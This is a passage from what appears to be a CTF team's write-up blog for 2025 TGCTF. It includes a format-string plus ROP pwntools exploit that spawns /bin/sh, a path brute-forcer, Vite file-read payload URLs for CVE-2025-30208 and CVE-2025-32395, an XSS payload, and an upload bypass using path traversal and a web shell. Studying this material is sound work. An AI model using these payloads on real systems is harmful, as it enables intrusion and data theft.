delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span></span><br><span class="line">    s(pay)</span><br><span class="line">    ru(<span class="string">b&quot;can &quot;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">    ret_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x8</span></span><br><span class="line">    success(<span class="string">f&quot;ret: <span class="subst">&#123;ret_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;else?\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr)</span><br><span class="line"></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line">    pay = <span class="string">f&quot;%45$p%<span class="subst">&#123;<span class="number">0x68</span>-<span class="number">14</span>&#125;</span>c%6$hhn&quot;</span>.encode()</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;magic:\n&quot;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">    pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rsp = ret_addr - <span class="number">0x118</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr) + fit(ret, pop_rdi_ret, binsh, system)</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&quot;else?&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rbp_offset = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    pay = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x8B</span>&#125;</span>c%6$hhn%<span class="subst">&#123;(rsp&amp;<span class="number">0xffff</span>) - <span class="number">0x8b</span>&#125;</span>c%<span class="subst">&#123;rbp_offset&#125;</span>$hn&quot;</span>.encode()</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;bbase 0x1327&quot;)</span></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h3 id="Reverse">Reverse</h3>
<h4 id="easy-choice">easy_choice</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w[<span class="number">8</span>] = &#123;<span class="number">0xAC3A28FD</span>, <span class="number">0x2331590C</span>, <span class="number">0x329F681B</span>, <span class="number">0xA6CF62DB</span>, <span class="number">0x8738A413</span>, <span class="number">0x44D27414</span>, <span class="number">0xDEF3A4CD</span>, <span class="number">0x5B22BA91</span>&#125;;<span class="comment">//可改</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">2</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x41</span>,<span class="number">0x53</span>,<span class="number">0x43</span>,<span class="number">0x54</span>&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sum;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key2[<span class="number">4</span>]=&#123;<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x41</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> o=<span class="number">0</span>;o&lt;<span class="number">4</span>;o++)</span><br><span class="line">	&#123;	</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		v[<span class="number">0</span>]=w[<span class="number">2</span>*o];</span><br><span class="line">		v[<span class="number">1</span>]=w[<span class="number">2</span>*o+<span class="number">1</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum -= delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key2[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key2[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum = sum-delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		w[<span class="number">2</span>*o]=v[<span class="number">0</span>];</span><br><span class="line">		w[<span class="number">2</span>*o+<span class="number">1</span>]=v[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;w[i]+<span class="number">0</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">1</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">2</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 TGCTF WriteUp By A1natas - AAAflag批发商</title>
    <url>//post/2025-tgctf/</url>
    <content><![CDATA[<p>由于A1natas官网和A1CTF正在重构，本博客将用于暂存A1natas的WriteUp</p>
<h2 id="Web：">Web：</h2>
<h3 id="AAA偷渡阴平">AAA偷渡阴平</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/3e7d77e8-45fa-4e28-b1b0-281e69b2a2ca.png"
                        alt=""
                 ></p>
<h3 id="火眼">火眼</h3>
<p>tgshell 直接连接马就行</p>
<h3 id="直面天命">直面天命</h3>
<p>先爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标网站的基础URL - 使用前请替换为实际目标URL</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># 请替换为实际目标URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用所有26个小写字母</span></span><br><span class="line">all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义测试单个路径的函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):</span><br><span class="line">    url = BASE_URL + path</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据状态码和响应长度来判断是否找到有效页面</span></span><br><span class="line">        status = response.status_code</span><br><span class="line">        length = <span class="built_in">len</span>(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录所有非404响应</span></span><br><span class="line">        <span class="keyword">if</span> status != <span class="number">404</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 保存发现的路径到文件中</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果是200状态码，保存响应内容以便检查</span></span><br><span class="line">            <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(response.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span>  <span class="comment"># 忽略连接错误，继续测试</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示开始信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破所有4字母路径...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 目标URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 总组合数: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (这可能需要一些时间)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跟踪进度变量</span></span><br><span class="line">total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># 可能的4字母组合总数</span></span><br><span class="line">completed = <span class="number">0</span></span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程加速过程</span></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    <span class="comment"># 生成并测试所有4字母组合</span></span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):</span><br><span class="line">        path = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">        executor.submit(test_path, path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 定期更新进度</span></span><br><span class="line">        completed += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:</span><br><span class="line">            elapsed = time.time() - start_time</span><br><span class="line">            percentage = (completed / total_combinations) * <span class="number">100</span></span><br><span class="line">            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            remaining = (total_combinations - completed) / \</span><br><span class="line">                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 进度: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span></span><br><span class="line">                  <span class="string">f&quot;已用时间: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>秒 - 预计剩余: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>秒 - 速度: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>请求/秒&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 爆破完成! 查看 &#x27;found_paths.txt&#x27; 获取结果。&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>路由是/aazz</p>
<p>访问提示可以传参，FUZZ一下，filename任意读，proc/1/environ出了</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/fae15437-d8cb-47d6-b560-fef9a65e75bf.png"
                        alt=""
                 ></p>
<h3 id="GAME">GAME</h3>
<p>通过调试拿到score：</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/6dfa6948-9850-4743-b09d-041193ef7837.png"
                        alt=""
                 > <img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/attachments/84abad31-e954-481a-b2d2-88cdae48758a.png"
                        alt="" title=" =1002x"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/c2273582-8380-47c8-9704-b777bd8a477d.png"
                        alt=""
                 ></p>
<p>目前到这里</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const container = document.querySelector(<span class="string">&#x27;.container&#x27;</span>)</span><br><span class="line">onst stage = document.querySelector(<span class="string">&#x27;.container&#x27;</span>).__vnode.ctx.devtoolsRawSetupState.games</span><br><span class="line">console.log(stage.score)</span><br><span class="line">stage.score = `&lt;img src=x onerror=<span class="string">&#x27;alert(114514)&#x27;</span>&gt;`;</span><br></pre></td></tr></table></figure>
<p><strong>CVE-2025-30208</strong></p>
<p>直接打就完了，<a class="link"   href="http://node2.tgctf.woooo.tech:30852/@fs//tgflagggg?import&amp;raw??" >http://node2.tgctf.woooo.tech:30852/@fs//tgflagggg?import&amp;raw??<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/f84fb547-19c4-4409-8b47-b237527ed072.png"
                        alt=""
                 ></p>
<h3 id="GAME-plus">GAME plus</h3>
<p>30208被修复了，主要修改了transform.ts。</p>
<p>但是可以打/@fs/etc/passwd?import&amp;?inline=1.wasm?init</p>
<p>inline不行就换成svg</p>
<p>（来自知识星球的一篇文章）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4adf82be-f543-4cf5-abf2-046f5d52fc92.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/99d486d3-e563-4793-b21c-39005e7c7152.png"
                        alt="" title=" =300x336"
                 ></p>
<h3 id="GAME-Ultra"><strong>GAME Ultra</strong></h3>
<p>附件为<code>&quot;vite&quot;: &quot;6.2.5&quot;,</code></p>
<p>直接打CVE-2025-32395</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/1.png"
                        alt="1"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://somokel.oss-cn-hangzhou.aliyuncs.com/img/2.png"
                        alt="2"
                 ></p>
<h3 id="ezupload">ezupload</h3>
<p>fuzz了一下，nginx＋php7，黑名单。</p>
<p>.bak找到源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">&#x27;UPLOAD_PATH&#x27;</span>, __DIR__ . <span class="string">&#x27;/uploads/&#x27;</span>);</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">$status_code = <span class="number">200</span>; // 默认状态码为 <span class="number">200</span></span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php2&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            $file_name = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $file_name = basename($_FILES[<span class="string">&#x27;name&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;name&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $file_content = file_get_contents($temp_file);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/.+?&lt;/s&#x27;</span>, $file_content)) &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;</span><br><span class="line">                $status_code = <span class="number">403</span>; // <span class="number">403</span> 表示禁止访问</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $img_path = UPLOAD_PATH . $file_name;</span><br><span class="line">                <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                    $is_upload = true;</span><br><span class="line">                    $msg = <span class="string">&#x27;文件上传成功！&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">                    $status_code = <span class="number">500</span>; // <span class="number">500</span> 表示服务器内部错误</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">            $status_code = <span class="number">403</span>; // <span class="number">403</span> 表示禁止访问</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">        $status_code = <span class="number">404</span>; // <span class="number">404</span> 表示资源未找到</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 设置 HTTP 状态码</span><br><span class="line">http_response_code($status_code);</span><br><span class="line"></span><br><span class="line">// 输出结果</span><br><span class="line">echo json_encode([</span><br><span class="line">    <span class="string">&#x27;status_code&#x27;</span> =&gt; $status_code,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span> =&gt; $msg,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<p>存在任意文件写，可以控制name为/…/ 跳转上一级</p>
<p>直接上传user。ini和一句话shell 就行</p>
<p>flag在环境变量</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/9dfadd35-1a34-433d-b1e9-05935dd74005.png"
                        alt=""
                 ></p>
<h3 id="什么文件上传？"><strong>什么文件上传？</strong></h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/643f0a7f-0ad2-41f4-9fca-dc582f6cc131.png"
                        alt=""
                 ></p>
<p>爆破一下上传后缀 <img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/fb84a46f-29a9-497c-b3e7-4281d5f419d8.png"
                        alt=""
                 ></p>
<p>直接打phar反序列化就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="comment">// error_reporting(0);</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>=<span class="string">&quot;study&quot;</span>;</span><br><span class="line">        <span class="comment">// public $try;</span></span><br><span class="line">        <span class="comment">// public function __construct()</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;learn = &quot;learn&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">// // &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;study-&gt;<span class="title function_ invoke__">hard</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">        <span class="comment">// public function __construct()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;did = &quot;What you did makes you outstanding.&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;done = <span class="string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;done;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;doing))==<span class="number">666</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doing</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;doing-&gt;better;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line">        <span class="comment">// public function __invoke()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;good=&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">//     echo $this-&gt;good;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// public function __get($arg1)&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;bad=&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$out</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$no</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span 